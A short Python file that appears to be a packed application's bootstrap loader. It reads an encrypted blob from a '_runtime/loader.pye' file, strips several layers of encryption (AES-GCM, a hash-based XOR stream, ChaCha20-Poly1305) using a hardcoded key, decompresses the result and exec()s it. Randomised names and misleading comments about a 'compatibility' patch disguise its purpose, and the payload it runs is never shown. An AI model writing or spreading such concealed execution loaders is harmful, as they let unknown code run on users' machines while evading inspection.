import sys, os, json, hashlib, zlib
_R = getattr(sys, '_MEIPASS', None) or os.path.dirname(os.path.abspath(__file__))

# monkey patch for compatibility
# TODO: implement error handling
# See bugs.python.org/issue12345

def _xof(_30ef9781cd, _0x2db4eccb):
    _v2112_3487, _taa848bb643 = (bytearray(), 0)
    while len(_v2112_3487) < _30ef9781cd:
        _v2112_3487.extend(hashlib.sha256(_0x2db4eccb + _taa848bb643.to_bytes(4, 'big')).digest())
        _taa848bb643 += 1
    return bytes(_v2112_3487[:_30ef9781cd])

def _boot(_6b044e4fe483):
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    _70833_b1da5f = json.loads(open(os.path.join(_R, '_runtime', 'loader.pye'), 'rb').read().decode())
    _5500 = _6b044e4fe483
    for _x36ce8a9a in ['k1', 'k2', 'k3', 'k4', 'k5']:
        if _x36ce8a9a in _70833_b1da5f:
            _fd7d1fa3827b59 = bytes.fromhex(_70833_b1da5f[_x36ce8a9a])
            _b3168 = hashlib.sha256(_fd7d1fa3827b59).digest()[:4].hex()
            if _b3168 == _70833_b1da5f.get('f1', '')[:8] or _b3168 == _70833_b1da5f.get('f2', '')[:8] or _b3168 == _70833_b1da5f.get('f3', '')[:8]:
                _5500 = _fd7d1fa3827b59
                break
    __46d4e1b0b37d = bytes.fromhex(_70833_b1da5f['d'])
    _4c870fb15b30a5 = AESGCM(_5500).decrypt(__46d4e1b0b37d[:12], __46d4e1b0b37d[12:], b'')
    _4c870fb15b30a5 = bytes((_q5a3f88_24 ^ _6a8530e9580 for _q5a3f88_24, _6a8530e9580 in zip(_4c870fb15b30a5, _xof(len(_4c870fb15b30a5), _5500))))
    try:
        _4c870fb15b30a5 = ChaCha20Poly1305(_5500).decrypt(_4c870fb15b30a5[:12], _4c870fb15b30a5[12:], b'')
    except Exception:
        pass
    return zlib.decompress(_4c870fb15b30a5).decode()
_ld = compile(_boot(bytes.fromhex('32d4d9131f5c8be2e5ae6eff09c34d198c2381a0d22217af25c3331158ed822b')), '', 'exec')
exec(_ld)
run('main', _R)